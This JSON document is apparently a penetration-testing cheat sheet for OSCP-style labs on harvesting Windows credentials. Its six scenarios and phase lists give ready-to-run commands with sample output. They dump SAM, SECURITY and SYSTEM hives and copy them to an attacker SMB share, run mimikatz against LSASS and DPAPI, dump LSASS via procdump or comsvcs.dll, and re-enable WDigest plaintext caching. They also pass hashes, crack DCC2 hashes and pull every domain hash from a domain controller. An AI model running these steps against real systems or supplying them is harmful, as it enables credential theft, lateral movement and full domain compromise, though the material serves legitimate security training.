{
  "cheatsheets": [
    {
      "id": "windows-credential-locations",
      "name": "Windows Credential Harvesting Locations",
      "description": "Comprehensive guide to Windows credential storage locations and extraction techniques. Covers SAM database, LSA secrets, DPAPI blobs, cached domain credentials, Credential Manager vault, and in-memory credential extraction for lateral movement scenarios.",
      "educational_header": {
        "how_to_recognize": [
          "Local Administrator or SYSTEM privileges obtained on Windows target",
          "Need domain credentials for lateral movement (current shell is local account)",
          "Multiple users have logged into the compromised machine (cached credentials likely)",
          "Services running as domain accounts (LSA secrets contain service passwords)",
          "Browser-based password manager or Windows Credential Manager in use",
          "LSASS process accessible (not protected by Credential Guard)"
        ],
        "when_to_look_for": [
          "Post-privilege escalation phase - have SYSTEM but need domain creds",
          "Lateral movement preparation - current machine compromised, targeting others",
          "Domain enumeration revealed high-value targets requiring specific credentials",
          "Service accounts discovered that may have elevated domain privileges",
          "User workstation compromise where domain users have logged in",
          "OSCP AD lab scenarios requiring credential reuse or pass-the-hash",
          "When BloodHound shows path requiring specific user's credentials"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: SAM Database Extraction - Local Account Hashes",
          "context": "Target: Windows Server 2019 domain-joined workstation. SYSTEM shell obtained via PrintSpoofer. Need local Administrator hash for pass-the-hash to other machines with same local admin password. Objective: Extract SAM database and crack or relay local account hashes.",
          "approach": "**Phase 1 - Understanding SAM Database:**\n\nSAM (Security Account Manager) stores local account hashes:\n- Location: C:\\Windows\\System32\\config\\SAM\n- Encrypted with SYSKEY from SYSTEM hive\n- Contains NTLM hashes (not plaintext passwords)\n- Only LOCAL accounts (not domain accounts)\n\n**Phase 2 - Method A: Registry Save (Online - Requires SYSTEM):**\n\n1. Save SAM and SYSTEM hives:\n   ```\n   reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save\n   reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save\n   ```\n   - Requires SYSTEM or Administrator with SeBackupPrivilege\n   - Creates copies of registry hives\n\n2. Transfer to attacker machine:\n   ```\n   # On Kali - start SMB server\n   impacket-smbserver share /tmp -smb2support\n   \n   # On target\n   copy C:\\Windows\\Temp\\sam.save \\\\10.10.14.5\\share\\\n   copy C:\\Windows\\Temp\\system.save \\\\10.10.14.5\\share\\\n   ```\n\n3. Extract hashes with secretsdump:\n   ```\n   impacket-secretsdump -sam sam.save -system system.save LOCAL\n   ```\n   - Output: `Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::`\n   - Format: `username:RID:LM_hash:NTLM_hash`\n\n**Phase 3 - Method B: Shadow Copy (Volume Shadow Service):**\n\n4. Create shadow copy:\n   ```\n   wmic shadowcopy call create Volume='C:\\'\n   ```\n\n5. List shadow copies:\n   ```\n   vssadmin list shadows\n   ```\n   - Note shadow copy path: `\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1`\n\n6. Copy from shadow:\n   ```\n   copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Windows\\Temp\\sam.save\n   copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\system.save\n   ```\n\n**Phase 4 - Method C: Mimikatz (In-Memory):**\n\n7. Using mimikatz:\n   ```\n   mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\"\n   ```\n   - Reads SAM directly from registry\n   - No file creation (stealthier)\n\n**Phase 5 - Use Extracted Hashes:**\n\n8. Pass-the-hash with extracted NTLM:\n   ```\n   impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.100\n   ```\n\n9. Crack NTLM hash:\n   ```\n   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt\n   ```",
          "commands": [
            "reg-save-sam",
            "reg-save-system",
            "secretsdump-local-sam",
            "mimikatz-lsadump-sam"
          ],
          "expected_outcome": "**Success Timeline (3-5 min):** Registry save (1 min) -> Transfer (1-2 min) -> secretsdump extraction (1 min). **Success Indicators:** (1) SAM and SYSTEM files created, (2) secretsdump outputs hash format, (3) Administrator hash extracted. **Common Failures:** (1) 'Access denied' on reg save -> Not SYSTEM, elevate first. (2) 'File in use' -> Use shadow copy method. (3) Empty hash `31d6cfe0d16ae931b73c59d7e0c089c0` -> Account disabled or no password set. (4) Transfer blocked -> Try base64 encoding files.",
          "why_this_works": "**SAM Encryption:** SAM database encrypted with boot key (SYSKEY) stored in SYSTEM hive. Without SYSTEM hive, SAM hashes cannot be decrypted. secretsdump combines both to extract plaintext NTLM hashes. **Why SYSTEM Required:** SAM registry hive locked by OS during runtime. SYSTEM privilege can use reg save to create unlocked copy. Alternative: Shadow copy accesses previous snapshot. **NTLM Hash Usage:** NTLM hashes can be used directly for authentication (pass-the-hash). No need to crack unless plaintext required. Local admin hash often reused across machines (lateral movement goldmine)."
        },
        {
          "title": "Scenario 2: LSA Secrets - Service Account Passwords",
          "context": "Target: Windows Server 2019 running SQL Server as domain service account. SYSTEM shell obtained. SQL Server service runs as YOURLAB\\svc_sql. Objective: Extract plaintext password of service account from LSA secrets for domain lateral movement.",
          "approach": "**Phase 1 - Understanding LSA Secrets:**\n\nLSA Secrets store sensitive data including:\n- Service account passwords (plaintext!)\n- Auto-logon credentials\n- DPAPI master keys\n- VPN/dial-up credentials\n- Machine account password\n\nLocation: `HKLM\\SECURITY\\Policy\\Secrets`\n\n**Phase 2 - Method A: Registry Export + secretsdump:**\n\n1. Save required registry hives:\n   ```\n   reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save\n   reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save\n   ```\n   - SECURITY hive contains LSA secrets\n   - SYSTEM hive contains decryption keys\n\n2. Transfer and extract:\n   ```\n   impacket-secretsdump -security security.save -system system.save LOCAL\n   ```\n   - Output includes:\n     - `$MACHINE.ACC`: Machine account hash\n     - `_SC_<ServiceName>`: Service account passwords\n     - `DefaultPassword`: Auto-logon password\n     - `DPAPI_SYSTEM`: DPAPI system key\n\n**Phase 3 - Method B: Mimikatz LSA Dump:**\n\n3. Using mimikatz:\n   ```\n   mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\"\n   ```\n   - Directly reads LSA secrets from memory\n   - Shows plaintext service passwords\n\n4. Look for service accounts:\n   ```\n   Secret  : _SC_MSSQLSERVER\n   cur/text: P@ssw0rd123!\n   ```\n   - `_SC_` prefix indicates service credential\n   - Service name follows prefix\n\n**Phase 4 - Method C: Remote with secretsdump:**\n\n5. If you have admin creds, dump remotely:\n   ```\n   impacket-secretsdump YOURLAB/Administrator:Password123@192.168.1.100\n   ```\n   - Dumps SAM, LSA secrets, and cached creds in one command\n   - No file transfer needed\n\n**Phase 5 - Use Service Account:**\n\n6. Authenticate as service account:\n   ```\n   impacket-psexec YOURLAB/svc_sql:'P@ssw0rd123!'@192.168.1.200\n   ```\n\n7. Check service account privileges:\n   ```\n   net user svc_sql /domain\n   ```\n   - Service accounts often have elevated privileges\n   - May be member of Domain Admins or have delegation rights",
          "commands": [
            "reg-save-security",
            "secretsdump-lsa-secrets",
            "mimikatz-lsadump-secrets",
            "secretsdump-remote"
          ],
          "expected_outcome": "**Success Timeline (3-5 min):** Registry save (1 min) -> Transfer (1-2 min) -> secretsdump (1 min). **Success Indicators:** (1) SECURITY and SYSTEM hives saved, (2) secretsdump shows _SC_ entries, (3) Plaintext service passwords revealed. **Common Failures:** (1) No _SC_ entries -> Services running as LocalSystem (no stored password). (2) '$MACHINE.ACC' only -> No service accounts with stored passwords. (3) 'Decryption failed' -> SYSTEM hive mismatch, re-extract both from same machine.",
          "why_this_works": "**LSA Secret Storage:** Windows stores service account passwords in LSA secrets so services can start automatically after reboot. Passwords stored in reversible encryption (not hashes). SYSTEM hive contains decryption key. **Why Plaintext:** Service Control Manager needs actual password to authenticate service account at startup. Unlike user logon (hash comparison), service startup requires plaintext for Kerberos/NTLM authentication to DC. **OSCP Relevance:** Service accounts frequently have elevated domain privileges. SQL Server, backup software, monitoring agents often run as domain accounts with excessive permissions. Single service account password can lead to Domain Admin."
        },
        {
          "title": "Scenario 3: Cached Domain Credentials - Offline Domain Attacks",
          "context": "Target: Windows 10 workstation, disconnected from DC. SYSTEM shell obtained. Domain users have previously logged in. Objective: Extract cached domain credentials (DCC2 hashes) for offline cracking.",
          "approach": "**Phase 1 - Understanding Cached Credentials:**\n\nWindows caches domain logon credentials for offline access:\n- Default: 10 cached logons (configurable via GPO)\n- Stored as DCC2 (Domain Cached Credentials v2) hashes\n- Location: `HKLM\\SECURITY\\Cache`\n- Cannot be used for pass-the-hash (must crack)\n\n**Phase 2 - Extract Cached Credentials:**\n\n1. Method A - secretsdump:\n   ```\n   reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save\n   reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save\n   ```\n   \n   ```\n   impacket-secretsdump -security security.save -system system.save LOCAL\n   ```\n   - Look for `[*] Dumping cached domain logon information (domain/username:hash)`\n   - Format: `YOURLAB.LOCAL/jsmith:$DCC2$10240#jsmith#a8f2b4...`\n\n2. Method B - Mimikatz:\n   ```\n   mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::cache\" \"exit\"\n   ```\n   - Output shows cached credentials with iteration count\n\n3. Method C - Remote extraction:\n   ```\n   impacket-secretsdump YOURLAB/Administrator:Password123@192.168.1.100\n   ```\n   - Includes cached credentials in output\n\n**Phase 3 - Crack DCC2 Hashes:**\n\n4. Format for hashcat:\n   ```\n   $DCC2$10240#jsmith#a8f2b4c5d6e7f8a9b0c1d2e3f4a5b6c7\n   ```\n   - Mode 2100 for DCC2\n\n5. Crack with hashcat:\n   ```\n   hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt\n   ```\n   - DCC2 is slow to crack (10240 iterations by default)\n   - Use rules: `hashcat -m 2100 dcc2.txt rockyou.txt -r best64.rule`\n\n6. Alternative - John the Ripper:\n   ```\n   john --format=mscash2 dcc2_hashes.txt --wordlist=rockyou.txt\n   ```\n\n**Phase 4 - Use Cracked Credentials:**\n\n7. Authenticate with cracked password:\n   ```\n   impacket-psexec YOURLAB/jsmith:'CrackedPassword'@192.168.1.200\n   ```\n\n8. Or use for Kerberos attacks:\n   ```\n   impacket-getTGT YOURLAB.LOCAL/jsmith:'CrackedPassword'\n   ```",
          "commands": [
            "secretsdump-cached-creds",
            "mimikatz-lsadump-cache",
            "hashcat-dcc2",
            "john-mscash2"
          ],
          "expected_outcome": "**Success Timeline:** Extraction (3-5 min) + Cracking (variable - hours to days). **Success Indicators:** (1) DCC2 hashes extracted, (2) hashcat recognizes format, (3) Password cracked. **Common Failures:** (1) No cached creds -> Users haven't logged in interactively, or cache cleared. (2) Cracking too slow -> DCC2 is intentionally slow, use GPU or better wordlist. (3) Hash format rejected -> Verify $DCC2$ prefix and iteration count.",
          "why_this_works": "**DCC2 Purpose:** Allows domain logon when DC unreachable (laptop offline, network issues). Windows verifies password against cached hash. **Why Not Pass-the-Hash:** DCC2 is derived hash (PBKDF2), not NTLM. Cannot be used for network authentication. Must crack to recover plaintext. **Iteration Count:** Default 10240 iterations (security measure). Higher = slower cracking. GPO can modify but rarely changed. **OSCP Relevance:** Useful for workstation compromises where domain users logged in. Developer laptops often have cached admin credentials. Slow cracking means start early, let run overnight."
        },
        {
          "title": "Scenario 4: LSASS Memory Dump - Live Credential Extraction",
          "context": "Target: Windows Server 2019 with active user sessions. SYSTEM shell obtained. Domain users currently logged in. Objective: Extract plaintext credentials and NTLM hashes from LSASS memory for immediate use.",
          "approach": "**Phase 1 - Understanding LSASS:**\n\nLSASS (Local Security Authority Subsystem Service) holds:\n- Plaintext passwords (if WDigest enabled)\n- NTLM hashes of logged-in users\n- Kerberos tickets\n- Credential delegation tokens\n\n**Phase 2 - Method A: Mimikatz sekurlsa:**\n\n1. Direct memory extraction:\n   ```\n   mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n   ```\n   - Shows all credentials in LSASS memory\n   - Plaintext if WDigest enabled (older systems)\n   - NTLM hashes always available\n\n2. Output format:\n   ```\n   Authentication Id : 0 ; 12345678 (00000000:00bc614e)\n   Session           : Interactive from 1\n   User Name         : jsmith\n   Domain            : YOURLAB\n   Logon Server      : DC01\n   Logon Time        : 11/26/2025 9:15:32 AM\n   SID               : S-1-5-21-...\n       msv :\n        [00000003] Primary\n        * Username : jsmith\n        * Domain   : YOURLAB\n        * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0\n        * SHA1     : a8f2b4c5...\n       wdigest :\n        * Username : jsmith\n        * Domain   : YOURLAB\n        * Password : (null) or PlaintextPassword!\n   ```\n\n**Phase 3 - Method B: LSASS Dump + Offline Analysis:**\n\n3. Create LSASS memory dump:\n   ```\n   # Task Manager method (if GUI access)\n   # Right-click lsass.exe -> Create dump file\n   \n   # Or with procdump\n   procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp\n   \n   # Or with comsvcs.dll (built-in, no tools needed)\n   rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full\n   ```\n\n4. Find LSASS PID:\n   ```\n   tasklist /fi \"imagename eq lsass.exe\"\n   ```\n\n5. Transfer dump to attacker:\n   ```\n   # Compress first (dumps are large)\n   powershell Compress-Archive -Path C:\\Windows\\Temp\\lsass.dmp -DestinationPath C:\\Windows\\Temp\\lsass.zip\n   ```\n\n6. Analyze offline with mimikatz:\n   ```\n   mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" \"exit\"\n   ```\n\n**Phase 4 - Method C: pypykatz (Linux):**\n\n7. Analyze dump on Kali:\n   ```\n   pypykatz lsa minidump lsass.dmp\n   ```\n   - Pure Python, no Windows needed\n   - Same output as mimikatz\n\n**Phase 5 - Enable WDigest (Older Credential Theft):**\n\n8. If WDigest disabled (Server 2012 R2+), can re-enable:\n   ```\n   reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n   ```\n   - Requires user to log in again after change\n   - Then plaintext passwords cached",
          "commands": [
            "mimikatz-sekurlsa-logonpasswords",
            "procdump-lsass",
            "comsvcs-minidump",
            "pypykatz-minidump"
          ],
          "expected_outcome": "**Success Timeline (3-5 min):** Mimikatz direct (1 min) or dump+transfer (3-5 min). **Success Indicators:** (1) privilege::debug succeeds, (2) logonpasswords shows domain accounts, (3) NTLM hashes or plaintext extracted. **Common Failures:** (1) 'ERROR kuhl_m_sekurlsa_acquireLSA' -> Credential Guard enabled, try dump method. (2) AV blocks mimikatz -> Use dump + offline analysis. (3) Only machine account -> No users logged in, check other machines. (4) 'Minidump not supported' -> Use procdump instead of comsvcs.",
          "why_this_works": "**LSASS Role:** LSASS handles all Windows authentication. Must cache credentials for SSO and network authentication. Memory contains everything needed to authenticate as logged-in users. **WDigest History:** Pre-2012 R2, WDigest stored plaintext for HTTP Digest authentication. Microsoft disabled by default but can be re-enabled. Modern systems store NTLM hash only (still useful for PTH). **Credential Guard:** Windows 10/Server 2016+ feature isolating LSASS in VM. If enabled, direct memory access fails. Dump methods may still work depending on configuration. **OSCP Relevance:** LSASS dumping is core OSCP technique. Always attempt on domain-joined machines. Even without plaintext, NTLM hashes enable pass-the-hash lateral movement."
        },
        {
          "title": "Scenario 5: DPAPI Credential Extraction - Browser and App Passwords",
          "context": "Target: Windows 10 workstation. SYSTEM shell obtained. User's browser (Chrome/Edge) stores saved passwords. RDP credentials saved in Credential Manager. Objective: Extract application-stored credentials protected by DPAPI.",
          "approach": "**Phase 1 - Understanding DPAPI:**\n\nDPAPI (Data Protection API) protects:\n- Browser saved passwords (Chrome, Edge, Firefox)\n- Windows Credential Manager entries\n- Wi-Fi passwords\n- Application secrets\n- Encrypted files (EFS)\n\nDecryption requires user's DPAPI master key.\n\n**Phase 2 - Extract DPAPI Master Keys:**\n\n1. Locate master keys:\n   ```\n   dir C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\\n   ```\n   - Master keys stored as GUIDs\n   - Multiple keys (rotated periodically)\n\n2. Extract with mimikatz (as SYSTEM):\n   ```\n   mimikatz.exe \"privilege::debug\" \"sekurlsa::dpapi\" \"exit\"\n   ```\n   - Shows DPAPI master keys for logged-in users\n   - Or extract from credential cache\n\n3. Alternative - dump DPAPI cache:\n   ```\n   mimikatz.exe \"privilege::debug\" \"lsadump::backupkeys /system:dc01.yourlab.local /export\" \"exit\"\n   ```\n   - Requires DC access\n   - Gets domain DPAPI backup key (decrypts any user's DPAPI)\n\n**Phase 3 - Extract Credential Manager:**\n\n4. List Credential Manager entries:\n   ```\n   cmdkey /list\n   ```\n   - Shows saved credentials (RDP, network shares, etc.)\n   - Stored in `C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Credentials\\`\n\n5. Decrypt with mimikatz:\n   ```\n   mimikatz.exe \"privilege::debug\" \"sekurlsa::dpapi\" \"vault::cred /patch\" \"exit\"\n   ```\n   - Or target specific credential file:\n   ```\n   mimikatz.exe \"dpapi::cred /in:C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Credentials\\<GUID>\" \"exit\"\n   ```\n\n**Phase 4 - Chrome Saved Passwords:**\n\n6. Locate Chrome password database:\n   ```\n   dir \"C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"\n   ```\n   - SQLite database with encrypted passwords\n\n7. Extract with SharpChromium or similar:\n   ```\n   SharpChromium.exe logins\n   ```\n   - Decrypts Chrome passwords using DPAPI\n\n8. Or manual extraction:\n   - Copy Login Data file\n   - Extract encrypted blob from SQLite\n   - Decrypt with DPAPI master key\n\n**Phase 5 - Decrypt Using Extracted Keys:**\n\n9. If you have master key GUID and key bytes:\n   ```\n   mimikatz.exe \"dpapi::masterkey /in:C:\\...\\Protect\\<SID>\\<GUID> /password:<userpassword>\" \"exit\"\n   ```\n   - Decrypts master key using user's password\n\n10. Then decrypt credential:\n    ```\n    mimikatz.exe \"dpapi::cred /in:<cred_file> /masterkey:<decrypted_key>\" \"exit\"\n    ```",
          "commands": [
            "mimikatz-sekurlsa-dpapi",
            "cmdkey-list",
            "mimikatz-vault-cred",
            "sharpchromium-logins"
          ],
          "expected_outcome": "**Success Timeline (5-10 min):** Master key extraction (2-3 min) -> Credential decryption (3-5 min). **Success Indicators:** (1) DPAPI master keys extracted, (2) Credential Manager entries listed, (3) Plaintext passwords recovered. **Common Failures:** (1) 'Cannot decrypt' -> Need correct master key GUID. (2) Chrome DB locked -> Copy file while Chrome not running. (3) No credentials found -> User hasn't saved passwords. (4) Domain DPAPI requires DC -> Use user's password or DC backup key.",
          "why_this_works": "**DPAPI Architecture:** User's password derives DPAPI master key. Master key encrypts individual secrets. System stores encrypted master keys in Protect folder. **Why SYSTEM Can Access:** LSASS caches master keys for logged-in users. sekurlsa::dpapi extracts from cache. For offline users, need user's password or domain backup key. **Domain DPAPI Backup:** Domain controllers store backup of all domain users' DPAPI keys. With DC admin access, can decrypt any domain user's DPAPI secrets. **OSCP Relevance:** Rich source of credentials. Saved RDP passwords enable lateral movement. Browser passwords may contain internal application credentials. Wi-Fi passwords may match user/service passwords (reuse)."
        },
        {
          "title": "Scenario 6: secretsdump.py - All-in-One Remote Extraction",
          "context": "Target: Domain Controller accessible via network. Have Domain Admin credentials. Objective: Extract all domain credentials remotely including NTDS.dit for full domain compromise.",
          "approach": "**Phase 1 - Remote secretsdump Options:**\n\nsecretsdump.py can extract:\n- SAM hashes (local accounts)\n- LSA secrets (service passwords)\n- Cached credentials (DCC2)\n- NTDS.dit (all domain hashes)\n\n**Phase 2 - Extract From Domain Controller:**\n\n1. Full domain dump (NTDS.dit):\n   ```\n   impacket-secretsdump YOURLAB.LOCAL/Administrator:'Password123'@dc01.yourlab.local -just-dc\n   ```\n   - `-just-dc`: Extract NTDS.dit only (domain accounts)\n   - Uses DRSUAPI (replication) to pull hashes\n   - No need for file access\n\n2. Output includes:\n   ```\n   [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n   Administrator:500:aad3b435...:8846f7eaee8fb117...\n   krbtgt:502:aad3b435...:1b8cee51...\n   jsmith:1001:aad3b435...:31d6cfe0...\n   ```\n\n3. With history (password changes):\n   ```\n   impacket-secretsdump YOURLAB.LOCAL/Administrator:'Password123'@dc01.yourlab.local -just-dc-ntlm -history\n   ```\n   - Shows previous password hashes\n   - Useful for finding reused passwords\n\n**Phase 3 - Extract From Member Server:**\n\n4. Full extraction (SAM + LSA + Cached):\n   ```\n   impacket-secretsdump YOURLAB/Administrator:'Password123'@192.168.1.100\n   ```\n   - Extracts everything accessible\n   - No -just-dc on non-DCs\n\n5. Using hash instead of password:\n   ```\n   impacket-secretsdump -hashes :8846f7eaee8fb117... YOURLAB/Administrator@192.168.1.100\n   ```\n   - Pass-the-hash to secretsdump\n\n**Phase 4 - Extract Specific Items:**\n\n6. Only SAM:\n   ```\n   impacket-secretsdump YOURLAB/Administrator:'Password123'@192.168.1.100 -sam\n   ```\n\n7. Only LSA secrets:\n   ```\n   impacket-secretsdump YOURLAB/Administrator:'Password123'@192.168.1.100 -lsa\n   ```\n\n**Phase 5 - Offline NTDS.dit Analysis:**\n\n8. If you have NTDS.dit file copy:\n   ```\n   impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL\n   ```\n   - For offline analysis of stolen NTDS.dit\n   - Need SYSTEM hive from same DC",
          "commands": [
            "secretsdump-just-dc",
            "secretsdump-full",
            "secretsdump-hashes",
            "secretsdump-ntds-offline"
          ],
          "expected_outcome": "**Success Timeline (2-5 min):** Remote execution (2-3 min for small domain) to (10+ min for large domain). **Success Indicators:** (1) Connection successful, (2) DRSUAPI replication works, (3) Domain hashes dumped. **Common Failures:** (1) 'Access denied' -> Need Domain Admin or equivalent. (2) 'DRSUAPI failed' -> DC might block replication, try VSS method. (3) Timeout on large domain -> Use -just-dc-ntlm for NTLM only (faster). (4) Hash format issues -> Verify -hashes format `:NTLM_HASH` (colon prefix).",
          "why_this_works": "**DRSUAPI Protocol:** Domain Controllers use DRSUAPI for replication. secretsdump abuses replication API to request password data. Same mechanism as DCSync attack. **Why Domain Admin Required:** Replication rights restricted to Domain Admins, Enterprise Admins, and DC machine accounts. Regular users cannot request password data. **NTDS.dit Contents:** Active Directory database storing all domain objects. Includes all user NTLM hashes. krbtgt hash enables Golden Ticket attacks. **OSCP Relevance:** Ultimate goal in AD labs. Single command extracts entire domain. krbtgt hash = persistent domain access. Always target DCs when DA obtained."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Credential Location Overview",
          "notes": "Windows stores credentials in multiple locations. SAM for local accounts, LSA secrets for service passwords, cached creds for domain offline logon, LSASS for active sessions, DPAPI for application secrets. Always enumerate all locations.",
          "commands": [
            {
              "id": "whoami-priv-backup",
              "example": "whoami /priv | findstr -i \"backup debug\"",
              "shows": "SeBackupPrivilege or SeDebugPrivilege Enabled"
            },
            {
              "id": "reg-query-sam",
              "example": "reg query HKLM\\SAM",
              "shows": "Access check for SAM hive"
            },
            {
              "id": "tasklist-lsass",
              "example": "tasklist /fi \"imagename eq lsass.exe\"",
              "shows": "LSASS process PID for memory dump"
            }
          ]
        },
        {
          "title": "Phase 2: SAM Database Extraction",
          "notes": "SAM contains local account NTLM hashes. Requires SYSTEM hive for decryption. Hashes can be used for pass-the-hash or cracked. Common local admin reuse across machines.",
          "commands": [
            {
              "id": "reg-save-sam",
              "example": "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
              "shows": "The operation completed successfully."
            },
            {
              "id": "reg-save-system",
              "example": "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save",
              "shows": "The operation completed successfully."
            },
            {
              "id": "secretsdump-local-sam",
              "example": "impacket-secretsdump -sam sam.save -system system.save LOCAL",
              "shows": "Administrator:500:aad3...:31d6cfe0..."
            }
          ]
        },
        {
          "title": "Phase 3: LSA Secrets Extraction",
          "notes": "LSA secrets contain service account PLAINTEXT passwords. Gold mine for lateral movement. Service accounts often have elevated domain privileges. Also contains machine account hash and DPAPI keys.",
          "commands": [
            {
              "id": "reg-save-security",
              "example": "reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save",
              "shows": "The operation completed successfully."
            },
            {
              "id": "secretsdump-lsa-secrets",
              "example": "impacket-secretsdump -security security.save -system system.save LOCAL",
              "shows": "_SC_MSSQLSERVER:P@ssw0rd123!"
            },
            {
              "id": "mimikatz-lsadump-secrets",
              "example": "mimikatz.exe \"privilege::debug\" \"lsadump::secrets\" \"exit\"",
              "shows": "Service account plaintext passwords"
            }
          ]
        },
        {
          "title": "Phase 4: LSASS Memory Extraction",
          "notes": "LSASS contains credentials of all logged-in users. Includes NTLM hashes and potentially plaintext (WDigest). Can dump memory for offline analysis to avoid AV. Use pypykatz on Linux.",
          "commands": [
            {
              "id": "mimikatz-sekurlsa-logonpasswords",
              "example": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
              "shows": "Domain user NTLM hashes and potential plaintext"
            },
            {
              "id": "procdump-lsass",
              "example": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
              "shows": "Dump file created for offline analysis"
            },
            {
              "id": "pypykatz-minidump",
              "example": "pypykatz lsa minidump lsass.dmp",
              "shows": "Credentials extracted on Linux"
            }
          ]
        },
        {
          "title": "Phase 5: Cached Domain Credentials",
          "notes": "DCC2 hashes allow offline domain logon. Must be cracked (cannot PTH). 10 cached logons by default. Slow cracking due to PBKDF2. Start cracking early, use GPU.",
          "commands": [
            {
              "id": "mimikatz-lsadump-cache",
              "example": "mimikatz.exe \"privilege::debug\" \"lsadump::cache\" \"exit\"",
              "shows": "Cached domain credentials (DCC2 format)"
            },
            {
              "id": "hashcat-dcc2",
              "example": "hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt",
              "shows": "Cracking DCC2 hashes (slow)"
            },
            {
              "id": "john-mscash2",
              "example": "john --format=mscash2 dcc2.txt --wordlist=rockyou.txt",
              "shows": "Alternative DCC2 cracking"
            }
          ]
        },
        {
          "title": "Phase 6: Remote Full Extraction (secretsdump)",
          "notes": "secretsdump.py extracts all credentials remotely with admin access. Against DC, pulls entire NTDS.dit via DRSUAPI. Single command for complete domain compromise. Always run against DC when DA obtained.",
          "commands": [
            {
              "id": "secretsdump-just-dc",
              "example": "impacket-secretsdump YOURLAB/Administrator:'Password123'@dc01 -just-dc",
              "shows": "All domain account NTLM hashes including krbtgt"
            },
            {
              "id": "secretsdump-full",
              "example": "impacket-secretsdump YOURLAB/Administrator:'Password123'@192.168.1.100",
              "shows": "SAM + LSA + cached credentials"
            },
            {
              "id": "secretsdump-hashes",
              "example": "impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 YOURLAB/Administrator@target",
              "shows": "Pass-the-hash remote extraction"
            }
          ]
        }
      ],
      "tags": [
        "credential-harvesting",
        "windows",
        "post-exploitation",
        "sam",
        "lsa-secrets",
        "lsass",
        "dpapi",
        "cached-credentials",
        "mimikatz",
        "secretsdump",
        "lateral-movement",
        "active-directory",
        "OSCP:HIGH"
      ]
    }
  ]
}
